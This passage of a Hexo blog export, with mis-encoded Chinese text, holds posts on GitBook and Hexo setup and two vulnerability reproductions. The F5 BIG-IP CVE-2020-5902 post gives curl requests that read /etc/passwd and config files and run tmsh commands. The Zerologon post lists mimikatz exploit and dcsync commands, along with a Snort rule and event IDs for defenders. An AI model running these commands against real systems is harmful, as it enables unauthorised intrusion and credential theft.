<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">* [å‰è¨€](README.md)</span><br><span class="line">* [ç¬¬ä¸€ç« ï¼šWeb](ç¬¬ä¸€ç« /readme.md)</span><br><span class="line">    * [ç¬¬ä¸€èŠ‚ï¼šSQL](ç¬¬ä¸€ç« /sql.md)</span><br><span class="line">* [ç¬¬äºŒç« ï¼šå†…ç½‘](ç¬¬äºŒç« /readme.md)</span><br><span class="line">    * [ç¬¬ä¸€èŠ‚ï¼šå·¥ä½œç»„](ç¬¬äºŒç« /readme.md)</span><br><span class="line">* [ç»“æŸè¯­](ç»“æŸè¯­/readme.md)</span><br><span class="line">* [ä½œè€…è¨€](ä½œè€…è¨€/readme.md)</span><br></pre></td></tr></table></figure>

<ul>
<li>å†æ¬¡ä½¿ç”¨<code>gitbook init</code>å‘½ä»¤ï¼Œå³å¯è‡ªåŠ¨ç”Ÿæˆè¶…é“¾æ¥å¯¹åº”çš„ç›®å½•å’Œæ–‡ä»¶ã€‚</li>
</ul>
<p><img src="/posts/6a0a2b53/image-20201014173802348.png" alt="image-20201014173802348"></p>
<ul>
<li><code>gitbook serve</code>æœ¬åœ°é¢„è§ˆï¼Œæ˜¯ä»¥ç½‘é¡µç‰ˆHTMLæ ¼å¼ï¼Œåœ¨åœ°å€æ æ‰“å¼€å³å¯ï¼ˆé»˜è®¤<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdDo0MDAw77yJ77yM5Y+v5L2/55SoYGdpdGJvb2s=">http://localhost:4000ï¼‰ï¼Œå¯ä½¿ç”¨`gitbook<i class="fa fa-external-link-alt"></i></span> serve â€“port 8888`æŒ‡å®šç«¯å£ã€‚</li>
</ul>
<h2 id="GitBookä¹¦ç±ç”Ÿæˆ"><a href="#GitBookä¹¦ç±ç”Ÿæˆ" class="headerlink" title="GitBookä¹¦ç±ç”Ÿæˆ"></a>GitBookä¹¦ç±ç”Ÿæˆ</h2><h3 id="é»˜è®¤æ ¼å¼ä¸ºHTML"><a href="#é»˜è®¤æ ¼å¼ä¸ºHTML" class="headerlink" title="é»˜è®¤æ ¼å¼ä¸ºHTML"></a>é»˜è®¤æ ¼å¼ä¸ºHTML</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> Ï€ ~/Desktop/code/book/afile â¯ gitbook build</span><br><span class="line">info: 7 plugins are installed</span><br><span class="line">info: 6 explicitly listed</span><br><span class="line">info: loading plugin <span class="string">&quot;highlight&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;search&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;lunr&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;sharing&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;fontsettings&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;theme-default&quot;</span>... OK</span><br><span class="line">info: found 6 pages</span><br><span class="line">info: found 0 asset files</span><br><span class="line">info: &gt;&gt; generation finished with success <span class="keyword">in</span> 0.5s !</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆåçš„HTMLä¹¦æ ¼å¼</span></span><br><span class="line">Ï€ ~/Desktop/code/book/afile â¯ tree _book</span><br><span class="line">_book</span><br><span class="line">â”œâ”€â”€ gitbook</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ fonts</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ fontawesome</span><br><span class="line">â”‚Â Â  â”‚Â Â      â”œâ”€â”€ FontAwesome.otf</span><br><span class="line">â”‚Â Â  â”‚Â Â      â”œâ”€â”€ fontawesome-webfont.eot</span><br><span class="line">â”‚Â Â  â”‚Â Â      â”œâ”€â”€ fontawesome-webfont.svg</span><br><span class="line">â”‚Â Â  â”‚Â Â      â”œâ”€â”€ fontawesome-webfont.ttf</span><br><span class="line">â”‚Â Â  â”‚Â Â      â”œâ”€â”€ fontawesome-webfont.woff</span><br><span class="line">â”‚Â Â  â”‚Â Â      â””â”€â”€ fontawesome-webfont.woff2</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ gitbook-plugin-fontsettings</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ fontsettings.js</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ website.css</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ gitbook-plugin-highlight</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ ebook.css</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ website.css</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ gitbook-plugin-lunr</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ lunr.min.js</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ search-lunr.js</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ gitbook-plugin-search</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ lunr.min.js</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ search-engine.js</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ search.css</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ search.js</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ gitbook-plugin-sharing</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ buttons.js</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ gitbook.js</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ images</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ apple-touch-icon-precomposed-152.png</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ favicon.ico</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ style.css</span><br><span class="line">â”‚Â Â  â””â”€â”€ theme.js</span><br><span class="line">â”œâ”€â”€ index.html</span><br><span class="line">â”œâ”€â”€ search_index.json</span><br><span class="line">â”œâ”€â”€ ï¿½\234ï¿½\200\205ï¿½\200</span><br><span class="line">â”‚Â Â  â””â”€â”€ readme.html</span><br><span class="line">â”œâ”€â”€ ç¬¬ï¿½\200ç« </span><br><span class="line">â”‚Â Â  â”œâ”€â”€ readme.html</span><br><span class="line">â”‚Â Â  â””â”€â”€ sql.html</span><br><span class="line">â”œâ”€â”€ ç¬¬ï¿½\214ç« </span><br><span class="line">â”‚Â Â  â””â”€â”€ readme.html</span><br><span class="line">â””â”€â”€ ï¿½\223ï¿½\235\237è¯­</span><br><span class="line">    â””â”€â”€ readme.html</span><br><span class="line"></span><br><span class="line">13 directories, 29 files</span><br></pre></td></tr></table></figure>

<h3 id="PDFæ ¼å¼"><a href="#PDFæ ¼å¼" class="headerlink" title="PDFæ ¼å¼"></a>PDFæ ¼å¼</h3><p>(éœ€è¦å®‰è£…<span class="exturl" data-url="aHR0cHM6Ly9jYWxpYnJlLWVib29rLmNvbS8=">https://calibre-ebook.com<i class="fa fa-external-link-alt"></i></span>)</p>
<ul>
<li><del>æœ¬ç«™MACç‰ˆä¸‹è½½åœ°å€ï¼š</del>(å¤§äº100MæŠ¥é”™)å¦‚æœæ˜¯ä»…ä»…ä¸ºäº†è§£å†³Hexoåšå®¢ä¸èƒ½éƒ¨ç½²çš„é—®é¢˜ï¼Œå¯ä»¥åˆ é™¤ åšå®¢ç›®å½•çš„ <code>.deploy_git</code>æ–‡ä»¶å¤¹ä¸‹çš„ <code>.git</code>å­æ–‡ä»¶å¤¹(å¤§æ–‡ä»¶çš„å†å²å°±ä¿å­˜åœ¨è¯¥æ–‡ä»¶ä¸‹ï¼‰ã€‚ç„¶ååœ¨ <code>.deploy_git</code>æ–‡ä»¶å¤¹ç›®å½•ä¸‹é‡æ–°<code>git init</code> ï¼Œå†å›åˆ°hexoé¡¹ç›®çš„æ ¹ç›®å½•ä¸‹é‡æ–°<code>hexo g</code> ã€<code>hexo d</code>å°±è¡Œäº†ã€‚</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¦‚æœæ²¡æœ‰é…ç½®ç¯å¢ƒå˜é‡ï¼Œè¯·æ‰‹åŠ¨æ·»åŠ </span></span><br><span class="line"><span class="comment"># npm install ebook-convert (æœ‰äººè¯´è¿™æ ·å¯ä»¥ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¸‹å¹¶ä¸è¡Œ)</span></span><br><span class="line">ln -s /Applications/calibre.app/Contents/MacOS/ebook-convert /usr/<span class="built_in">local</span>/bin</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> Ï€ ~/Desktop/code/book/afile â¯ gitbook pdf</span><br><span class="line">info: 7 plugins are installed</span><br><span class="line">info: 6 explicitly listed</span><br><span class="line">info: loading plugin <span class="string">&quot;highlight&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;search&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;lunr&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;sharing&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;fontsettings&quot;</span>... OK</span><br><span class="line">info: loading plugin <span class="string">&quot;theme-default&quot;</span>... OK</span><br><span class="line">info: found 6 pages</span><br><span class="line">info: found 0 asset files</span><br><span class="line">info: &gt;&gt; generation finished with success <span class="keyword">in</span> 5.1s !</span><br><span class="line">info: &gt;&gt; 1 file(s) generated</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆçš„æ–‡ä»¶åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ï¼Œå³ä¹¦çš„æ ¹ç›®å½•ã€‚</p>
<p><img src="/posts/6a0a2b53/image-20201015094305160.png" alt="image-20201015094305160"></p>
<h3 id="Epubæ ¼å¼"><a href="#Epubæ ¼å¼" class="headerlink" title="Epubæ ¼å¼"></a>Epubæ ¼å¼</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gitbook epub</span><br></pre></td></tr></table></figure>



<ul>
<li>ä»¥ä¸Šæ‰€æœ‰å‡åœ¨æœ¬åœ°ï¼Œå¦‚éœ€åŒæ­¥Githubç­‰å¹³å°ï¼ŒæŒ‰ç…§å¹³å¸¸åŒæ­¥å³å¯ã€‚</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init </span><br><span class="line">git remote add origin https://github.com/xx/xx.git</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;add book&quot;</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure>



<p>ç¥æ‚¨ç”Ÿæ´»æ„‰å¿«ï¼</p>
]]></content>
      <categories>
        <category>å·¥å…·ä½¿ç”¨</category>
      </categories>
      <tags>
        <tag>gibook</tag>
      </tags>
  </entry>
  <entry>
    <title>cve-2020-5902 BIG-IP RCEæ¼æ´å¤ç°</title>
    <url>/posts/714a2891/</url>
    <content><![CDATA[<p>æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œæ„é€ æ¶æ„è¯·æ±‚ï¼Œåœ¨æœªæˆæƒçš„æƒ…å†µä¸‹é€šè¿‡å‘æ¼æ´é¡µé¢å‘é€ç‰¹åˆ¶çš„è¯·æ±‚åŒ…ï¼Œå¯ä»¥é€ æˆä»»æ„ Java ä»£ç æ‰§è¡Œã€‚è¿›è€Œæ§åˆ¶ F5 BIG-IP çš„å…¨éƒ¨åŠŸèƒ½ï¼ŒåŒ…æ‹¬ä½†ä¸é™äº: æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€å¼€å¯/ç¦ç”¨æœåŠ¡ã€åˆ›å»º/åˆ é™¤æœåŠ¡å™¨ç«¯æ–‡ä»¶ç­‰ã€‚</p>
<a id="more"></a>

<ul>
<li>åŸæ–‡åœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy9wLzEzMjUzMjg4Lmh0bWw=">https://www.cnblogs.com/potatsoSec/p/13253288.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h2 id="0x01-ç®€ä»‹"><a href="#0x01-ç®€ä»‹" class="headerlink" title="0x01 ç®€ä»‹"></a>0x01 ç®€ä»‹</h2><p>åœ¨F5 BIG-IP æ˜¯ç¾å›½ F5 å…¬å¸çš„ä¸€æ¬¾é›†æˆäº†ç½‘ç»œæµé‡ç®¡ç†ã€åº”ç”¨ç¨‹åºå®‰å…¨ç®¡ç†ã€è´Ÿè½½å‡è¡¡ç­‰åŠŸèƒ½çš„åº”ç”¨äº¤ä»˜å¹³å°ã€‚2020å¹´7æœˆ1æ—¥ï¼ŒF5å®˜æ–¹å…¬å¸ƒæµé‡ç®¡ç†ç”¨æˆ·ç•Œé¢ï¼ˆTMUIï¼‰å­˜åœ¨ å‰å°è¿œç¨‹æ‰§è¡Œä»£ç ï¼ˆRCEï¼‰æ¼æ´ï¼ˆCVE-2020-5902ï¼‰ã€‚</p>
<h2 id="0x02-å½±å“èŒƒå›´"><a href="#0x02-å½±å“èŒƒå›´" class="headerlink" title="0x02 å½±å“èŒƒå›´"></a>0x02 å½±å“èŒƒå›´</h2><p>ç‰ˆæœ¬å·ä¸»è¦å¦‚ä¸‹ï¼š</p>
<ul>
<li>BIG-IP 15.x: &lt; 15.1.0.3</li>
<li>BIG-IP 14.x: &lt; 14.1.2</li>
<li>BIG-IP 13.x: &lt; 13.1.3</li>
<li>BIG-IP 12.x: &lt; 12.1.5</li>
<li>BIG-IP 11.x: &lt; 11.6.5</li>
</ul>
<h2 id="0x03-POC"><a href="#0x03-POC" class="headerlink" title="0x03 POC"></a>0x03 POC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -k  <span class="string">&#x27;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line">https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span><br><span class="line"></span><br><span class="line">https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts</span><br><span class="line"></span><br><span class="line">https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license</span><br><span class="line"></span><br><span class="line">https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</span><br></pre></td></tr></table></figure>

<p><img src="/posts/714a2891/imgRead_File.png"></p>
<h2 id="0x04-RCE"><a href="#0x04-RCE" class="headerlink" title="0x04 RCE"></a>0x04 RCE</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -k  <span class="string">&#x27;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/714a2891/imgRCE.png"></p>
<h2 id="0x05-ä¿®å¤æ–¹æ³•"><a href="#0x05-ä¿®å¤æ–¹æ³•" class="headerlink" title="0x05 ä¿®å¤æ–¹æ³•"></a>0x05 ä¿®å¤æ–¹æ³•</h2><p>å‡çº§<br> 11.6.5.2, 12.1.5.2, 13.1.3.4, 14.1.2.6, 15.1.0.4</p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>eve-2020-5902</tag>
      </tags>
  </entry>
  <entry>
    <title>mimikatzåˆ©ç”¨zerologonæ”»å‡»åŸŸæ§æœåŠ¡å™¨ç›¸å…³å‘½ä»¤ï¼ˆé™„è“é˜Ÿè‡ªæŸ¥æ–¹æ¡ˆ)</title>
    <url>/posts/f4b8e3a6/</url>
    <content><![CDATA[<p>ç›‘æµ‹åˆ°å›½å¤–å®‰å…¨å‚å•†å‘å¸ƒäº†NetLogon  æƒé™æå‡æ¼æ´ï¼ˆCVE-2020-1472ï¼‰çš„è¯¦ç»†æŠ€æœ¯åˆ†ææ–‡ç« å’ŒéªŒè¯è„šæœ¬ã€‚æ­¤æ¼æ´æ˜¯å¾®è½¯8æœˆä»½å‘å¸ƒå®‰å…¨å…¬å‘ŠæŠ«éœ²çš„ç´§æ€¥æ¼æ´ï¼Œæ¼æ´è¯„åˆ†10åˆ†ï¼Œæ¼æ´åˆ©ç”¨åæœä¸¥é‡ï¼Œæœªç»èº«ä»½è®¤è¯çš„æ”»å‡»è€…å¯é€šè¿‡ä½¿ç”¨ Netlogon è¿œç¨‹åè®®ï¼ˆMS-NRPCï¼‰è¿æ¥åŸŸæ§åˆ¶å™¨æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…å¯è·å¾—åŸŸç®¡ç†å‘˜è®¿é—®æƒé™ã€‚</p>
<a id="more"></a>

<ul>
<li>åŸæ–‡åœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy9wLzEzNzEwOTQ3Lmh0bWw=">https://www.cnblogs.com/potatsoSec/p/13710947.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01 å‰è¨€"></a>0x01 å‰è¨€</h2><p>mimikatz 20200918ç‰ˆæœ¬æ”¯æŒé€šè¿‡zerologonæ¼æ´æ”»å‡»åŸŸæ§æœåŠ¡å™¨ã€‚</p>
<ul>
<li>ä¸‹è½½é“¾æ¥ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHovcmVsZWFzZXMvdGFnLzIuMi4wLTIwMjAwOTE4LWZpeA==">Githubåœ°å€<i class="fa fa-external-link-alt"></i></span></li>
<li>æœ¬ç«™ä¸‹è½½åœ°å€ï¼š<a href="mimikatz_trunk.7z">æœ¬ç«™ä¸‹è½½</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl md5  mimikatz_trunk.7z</span><br><span class="line">MD5(mimikatz_trunk.7z)= a0d09c0170c224d89cfa49ba6634630f</span><br></pre></td></tr></table></figure>

<p><img src="/posts/f4b8e3a6/img93626780-37aa7880-f9e4-11ea-9b13-09fbd74f9b7b.png" alt="img"></p>
<h2 id="0x02-åˆ©ç”¨æ–¹å¼"><a href="#0x02-åˆ©ç”¨æ–¹å¼" class="headerlink" title="0x02 åˆ©ç”¨æ–¹å¼"></a>0x02 åˆ©ç”¨æ–¹å¼</h2><ol>
<li><code>lsadump::zerologon /target:dc.hacke.testlab /account:dc$  </code>poc</li>
<li><code> lsadump::zerologon /target:dc.hacke.testlab /account:dc$ /exploit  é€šè¿‡zerologon</code>æ¼æ´æ”»å‡»åŸŸæ§æœåŠ¡å™¨</li>
<li><code>lsadump::dcsync</code></li>
<li><code>lsadump::postzerologon /target:conttosson.locl /account:dc$ #</code>æ¢å¤å¯†ç </li>
</ol>
<p><img src="/posts/f4b8e3a6/img317949341039073162.jpg" alt="img317949341039073162"></p>
<h2 id="0x03-snort-æ£€æµ‹è§„åˆ™"><a href="#0x03-snort-æ£€æµ‹è§„åˆ™" class="headerlink" title="0x03 snort æ£€æµ‹è§„åˆ™"></a>0x03 snort æ£€æµ‹è§„åˆ™</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alert tcp any any -&gt; any ![139,445] (msg:<span class="string">&quot;Possible Mimikatz Zerologon Attempt&quot;</span>; flow:established,to_server; content:<span class="string">&quot;|00|&quot;</span>; offset:2; content:<span class="string">&quot;|0f 00|&quot;</span>; distance:22; within:2; fast_pattern; content:<span class="string">&quot;|00 00 00 00 00 00 00 00 ff ff 2f 21|&quot;</span>; within:90; reference:url,https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200916; classtype:attempted-admin; sid:20166330; rev:2; metadata:created_at 2020_09_19;)</span><br></pre></td></tr></table></figure>

<h2 id="0x04-pcapåŒ…"><a href="#0x04-pcapåŒ…" class="headerlink" title="0x04 pcapåŒ…"></a>0x04 pcapåŒ…</h2><p>åˆ©ç”¨zerologonæ¼æ´æ”»å‡»åŸŸæ§çš„æ•°æ®åŒ…ï¼Œæ–¹ä¾¿åŒå­¦ä»¬å†™å®Œè§„åˆ™åšæµ‹è¯•ã€‚</p>
<ul>
<li><p>æœ¬ç«™ä¸‹è½½åœ°å€ï¼š<a href="CVE-2020-1472_Zerologon_RPC_NetLogon_NullChallenge_SecChan_6_from_nonDC_to_DC.pcapng">æœ¬ç«™ä¸‹è½½åœ°å€</a></p>
</li>
<li><p>Githubåœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Nib3Vzc2VhZGVuL1BDQVAtQVRUQUNLL2Jsb2IvbWFzdGVyL0xhdGVyYWwlMjBNb3ZlbWVudC9DVkUtMjAyMC0xNDcyX1plcm9sb2dvbl9SUENfTmV0TG9nb25fTnVsbENoYWxsZW5nZV9TZWNDaGFuXzZfZnJvbV9ub25EQ190b19EQy5wY2Fwbmc=">Githubåœ°å€<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<h2 id="0x05-windowsäº‹ä»¶ç®¡ç†å™¨è‡ªæŸ¥"><a href="#0x05-windowsäº‹ä»¶ç®¡ç†å™¨è‡ªæŸ¥" class="headerlink" title="0x05 windowsäº‹ä»¶ç®¡ç†å™¨è‡ªæŸ¥"></a>0x05 windowsäº‹ä»¶ç®¡ç†å™¨è‡ªæŸ¥</h2><p>åœ¨æœªæ‰“è¡¥ä¸çš„åŸŸæ§ï¼Œé‡ç‚¹æŸ¥çœ‹windowsäº‹ä»¶ç®¡ç†å™¨ä¸­ï¼Œeventidä¸º4742æˆ–è€…4624, 5805</p>
<p>åœ¨windows 8æœˆæ›´æ–°ä¸­ï¼Œæ–°å¢äº‹ä»¶ID 5829ï¼Œ5827ï¼Œ5828ï¼Œ5830ï¼Œ5831ã€‚è“é˜Ÿå¯ä»¥é‡ç‚¹å…³æ³¨è¿™å‡ ä¸ªäº‹ä»¶IDä»¥æ–¹ä¾¿è‡ªæŸ¥</p>
<ol>
<li>å½“åœ¨åˆå§‹éƒ¨ç½²é˜¶æ®µå…è®¸å­˜åœ¨æ¼æ´çš„Netlogonå®‰å…¨é€šé“è¿æ¥æ—¶ï¼Œå°†ç”Ÿæˆäº‹ä»¶ID 5829ã€‚</li>
<li>ç®¡ç†å‘˜å¯ä»¥ç›‘æ§äº‹ä»¶ID 5827å’Œ5828ï¼Œè¿™äº›äº‹ä»¶IDåœ¨å­˜åœ¨æ¼æ´çš„Netlogonè¿æ¥è¢«æ‹’ç»æ—¶è§¦å‘</li>
<li>5830ï¼Œ5831  å¦‚æœâ€œåŸŸæ§åˆ¶å™¨ï¼šå…è®¸æ˜“å—æ”»å‡»çš„Netlogonå®‰å…¨é€šé“è¿æ¥â€ç»„ç­–ç•¥å…è®¸è¿æ¥ã€‚</li>
</ol>
<p>mimikatzé€šè¿‡zerologonæ”»å‡»æˆåŠŸåï¼Œå°†ä¼šç•™ä¸‹äº‹ä»¶idä¸º4648ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
        <tag>Mimikaz</tag>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexoè®°å½•</title>
    <url>/posts/2c0d0e17/</url>
    <content><![CDATA[<p>æœ‰å…³Hexoçš„è¸©å‘è®°å½•ï¼Œä¸»è¦æ˜¯å­—ä½“ã€åº•éƒ¨ä¿¡æ¯ã€æ–‡ç« åŠ å¯†ã€å›¾ç‰‡è·¯å¾„å¤„ç†ã€‚æˆªè‡³ç›®å‰çš„æœ€æ–°ç‰ˆNextã€‚</p>
<a id="more"></a>.

<h2 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init</span><br><span class="line"></span><br><span class="line"><span class="comment"># git clone https://github.com/iissnan/hexo-theme-next.git themes/next(å·²ç»ä¸åœ¨ç»´æŠ¤)</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br><span class="line"></span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<h2 id="äºŒæ¬¡å…ƒäººç‰©"><a href="#äºŒæ¬¡å…ƒäººç‰©" class="headerlink" title="äºŒæ¬¡å…ƒäººç‰©"></a>äºŒæ¬¡å…ƒäººç‰©</h2><p><code>npm install --save hexo-helper-live2d</code>å¯¹åº”çš„æ¨¡ç‰ˆå‚æ•°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Live2D</span></span><br><span class="line"><span class="comment">## https://github.com/EYHN/hexo-helper-live2d</span></span><br><span class="line">live2d:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  <span class="comment"># enable: false</span></span><br><span class="line">  pluginRootPath: live2dw/ <span class="comment"># Root path of plugin to be on the site (Relative)</span></span><br><span class="line">  pluginJsPath: lib/ <span class="comment"># JavaScript path related to plugin&#x27;s root (Relative)</span></span><br><span class="line">  pluginModelPath: assets/ <span class="comment"># Relative model path related to plugin&#x27;s root (Relative)</span></span><br><span class="line">  scriptFrom: <span class="built_in">local</span> <span class="comment"># Default</span></span><br><span class="line">  <span class="comment"># scriptFrom: jsdelivr # jsdelivr CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: unpkg # unpkg CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # Your custom url</span></span><br><span class="line">  tagMode: <span class="literal">false</span> <span class="comment"># Whether only to replace live2d tag instead of inject to all pages</span></span><br><span class="line">  <span class="built_in">log</span>: <span class="literal">false</span> <span class="comment"># Whether to show logs in console</span></span><br><span class="line">  model:</span><br><span class="line">    <span class="comment">#use: live2d-widget-model-wanko # npm-module package name</span></span><br><span class="line">    use: live2d-widget-model-shizuku</span><br><span class="line">    <span class="comment"># use: live2d-widget-model-miku</span></span><br><span class="line">    <span class="comment"># use: live2d-widget-model-tororo</span></span><br><span class="line">    <span class="comment"># use: live2d-widget-model-tsumiki</span></span><br><span class="line">    <span class="comment"># use: live2d-widget-model-unitychan</span></span><br><span class="line">    <span class="comment"># use: live2d-widget-model-nito</span></span><br><span class="line">    <span class="comment"># use: live2d-widget-model-chitose</span></span><br><span class="line">    <span class="comment"># use: live2d-widget-model-epsilon2_1</span></span><br><span class="line">    <span class="comment"># use: wanko # folder name in (hexo base dir)/live2d_models/</span></span><br><span class="line">    <span class="comment"># use: ./wives/wanko # folder path relative to hexo base dir</span></span><br><span class="line">    <span class="comment"># use: https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # Your custom url</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="å­—ä½“è®¾ç½®"><a href="#å­—ä½“è®¾ç½®" class="headerlink" title="å­—ä½“è®¾ç½®"></a>å­—ä½“è®¾ç½®</h2><p>å­—ä½“è®¾ç½®<code>Next</code>çš„ä¸»é¢˜é…ç½®æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">font:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Uri of fonts host, e.g. https://fonts.googleapis.com (Default).</span></span><br><span class="line">  host:</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font options:</span></span><br><span class="line">  <span class="comment"># `external: true` will load this font family from `host` above.</span></span><br><span class="line">  <span class="comment"># `family: Times New Roman`. Without any quotes.</span></span><br><span class="line">  <span class="comment"># `size: x.x`. Use `em` as unit. Default: 1 (16px)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Global font settings used for all elements inside &lt;body&gt;.</span></span><br><span class="line">  global:</span><br><span class="line">    external: <span class="literal">true</span></span><br><span class="line">    family: Lato</span><br><span class="line">    <span class="comment"># family: Monda</span></span><br><span class="line">    size:</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for site title (.site-title).</span></span><br><span class="line">  title:</span><br><span class="line">    external: <span class="literal">true</span></span><br><span class="line">    family: Lobster Two</span><br><span class="line">    size:</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for headlines (&lt;h1&gt; to &lt;h6&gt;).</span></span><br><span class="line">  headings:</span><br><span class="line">    external: <span class="literal">true</span></span><br><span class="line">    <span class="comment"># family:</span></span><br><span class="line">    family: Lobster Two</span><br><span class="line">    size:</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for posts (.post-body).</span></span><br><span class="line">  posts:</span><br><span class="line">    external: <span class="literal">true</span></span><br><span class="line">    family: Lobster Two</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for &lt;code&gt; and code blocks.</span></span><br><span class="line">  codes:</span><br><span class="line">    external: <span class="literal">true</span></span><br><span class="line">    family:  </span><br></pre></td></tr></table></figure>

